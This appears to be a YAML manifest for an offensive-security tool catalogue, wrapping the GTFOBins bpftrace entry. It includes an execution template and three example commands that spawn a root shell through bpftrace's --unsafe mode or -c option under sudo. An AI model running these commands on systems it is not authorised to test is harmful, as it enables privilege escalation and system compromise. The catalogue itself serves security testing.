---
id: system-trace-bpftrace
namespace: system:trace:bpftrace
name: bpftrace
description: High-level tracing language for Linux eBPF, can spawn a shell with --unsafe mode via sudo.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs:
    - type: security.execution.context
      description: Sudo execution context (root required)
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: medium
    memory_mb: 32
    network: none
    disk_io: low
resource_profile:
  cpu: medium
  memory_mb: 32
  network: none
  disk_io: low
allowed-tools:
  - bpftrace
  - Bash
  - execFile
parameters: []
features:
  - requires-root
  - process-manip
execution:
  template: "bpftrace --unsafe -e 'BEGIN {system(\"/bin/sh 1<&0\");exit()}'"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via bpftrace --unsafe
    command: bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
  - description: Spawn a shell via bpftrace script file
    command: |
      echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
      bpftrace --unsafe /path/to/temp-file
  - description: Spawn a shell via bpftrace -c option
    command: bpftrace -c /bin/sh -e 'END {exit()}'
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/bpftrace/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "bpftrace"
    commands:
      - "apt-get install -y bpftrace"
---
